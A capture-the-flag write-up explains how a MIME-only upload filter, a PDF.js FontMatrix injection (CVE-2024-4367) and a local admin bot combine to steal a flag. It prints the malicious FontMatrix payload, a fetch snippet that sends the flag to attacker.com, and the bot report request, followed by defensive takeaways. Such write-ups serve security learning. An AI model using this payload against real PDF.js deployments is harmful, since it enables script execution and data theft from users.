
# 🚀 **Mysterious File Upload Journey: Breaking PDF.js and Grabbing the Flag**

![Challenge Banner](https://media1.tenor.com/m/54mjjpuowCgAAAAd/ninjala-jane.gif)

### **Challenge Information**
- **Name:** Navigate a Mysterious File Upload Journey  
- **Challenge URL:** [http://172.206.89.197:9000/](http://172.206.89.197:9000/)  
- **Bot URL:** [http://172.206.89.197:9000/report](http://172.206.89.197:9000/report)  
- **Attachment:** [upload.zip](./upload.zip)  
- **Author:** [@S0nG0ku](https://twitter.com/s0ng0ku)  

---

## **📖 Introduction**
This writeup details how we explored a file upload challenge to bypass security filters and extract a flag from a restricted endpoint. Here's how the adventure unfolded:

1. Register on the platform.
2. Analyze the upload feature.
3. Exploit PDF.js to execute arbitrary JavaScript.
4. Retrieve the flag using the admin bot.

---

## **🕵️ Recon and Discovery**

### **1️⃣ Homepage**
The homepage presents a **login/register** feature and a basic upload interface.

![Homepage Screenshot](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*siGDgDwLDubjrv_6xkE5iQ.png)

### **2️⃣ Upload Feature**
Upon logging in, we access the **upload form**. The filter applied here is based only on **MIME type** validation, making it susceptible to tampering.

```html
<!-- Upload Filter in Source Code -->
if (file.mimeType === 'application/pdf') {
    // Allow upload
}
```
![Homepage Screenshot](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*peqYpT6c7tgO05KshrvWAg.png)

This weakness invites further exploration, but before rushing into bypasses, we check additional features.

---

## **⚙️ Understanding the Bot**
- **Behavior:** The admin bot visits **local URLs** shared through the application, verified using a **regex filter**.  
- **Access Scope:** The bot has privileged access to the `/flag` endpoint, which is restricted to **local IPs only (127.0.0.1)**.

---

## **💡 The Exploit Plan**
To retrieve the flag, we'll use the following approach:

1. **Upload a malicious PDF** containing JavaScript to access `/flag` and send its content to our external server.  
2. **Send the bot a link** to the malicious PDF file hosted on the challenge server.  
3. The bot will execute our JavaScript and exfiltrate the flag to us.

---

## **📜 Crafting the Malicious PDF**
The platform uses **PDF.js** for rendering uploaded PDF files. A known vulnerability, **CVE-2024-4367**, allows **arbitrary JavaScript execution** through the `FontMatrix` attribute.

### **Vulnerability Exploit**
The payload injects JavaScript by escaping parentheses in the `FontMatrix` field:
```javascript
/FontMatrix [1 2 3 4 5 (0\); fetch('/flag')
    .then(r => r.text())
    .then(f => location='https://attacker.com/?flag=' + encodeURIComponent(f))]
```

### **Steps to Create the PDF**
1. Use a PDF generation tool (e.g., [PDFEdit](https://pdfedit.cz/) or Python libraries like `fpdf`) to embed the exploit.
2. Ensure all parentheses are escaped to prevent premature interpretation.

---

## **🖥️ Exploiting the Bot**
1. Upload the malicious PDF file.
2. Grab the file's URL and modify it to point to `127.0.0.1:5000/view/<filename>` for local bot access.
3. Send the URL to the bot via the provided reporting feature.

```plaintext
POST /report
Content-Type: application/json

{
    "url": "http://127.0.0.1:5000/view/malicious.pdf"
}
```

4. Wait for the bot to visit the URL and execute the JavaScript.

---

## **🏁 Retrieving the Flag**
Once the bot executes the script, it fetches the flag from `/flag` and sends it to our server:
```javascript
fetch('/flag')
    .then(response => response.text())
    .then(flag => {
        location = `https://attacker.com/?flag=${encodeURIComponent(flag)}`;
    });
```

The flag will appear in your server logs, and in this case, it's:

```plaintext
AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}
```

---

## **🎯 Key Takeaways**
1. **MIME Type Filters:** Always validate files using deeper inspection (e.g., content-based validation).
2. **Bot Exploits:** Bots with local access should have strict sandboxing to prevent malicious exploitation.
3. **PDF.js Vulnerabilities:** Always use the latest versions of libraries to patch known vulnerabilities.

---

## **📚 Resources**
- [PDF.js Documentation](https://mozilla.github.io/pdf.js/)
- [CVE-2024-4367 Details](https://cve.mitre.org/)
- [PDF Injection with JavaScript](https://codeanlabs.com/pdf-js-injection)
- [File Upload Security Best Practices](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

## **🌈 Bonus: Make It Your Own!**
You can use this approach in Capture The Flag (CTF) competitions or educational scenarios to practice:
- **File upload bypass techniques.**
- **Exploiting vulnerable libraries.**
- **Exfiltration using JavaScript payloads.**

> **Disclaimer:** This writeup is for educational purposes only. Always ensure you have proper authorization before performing any security testing.

---
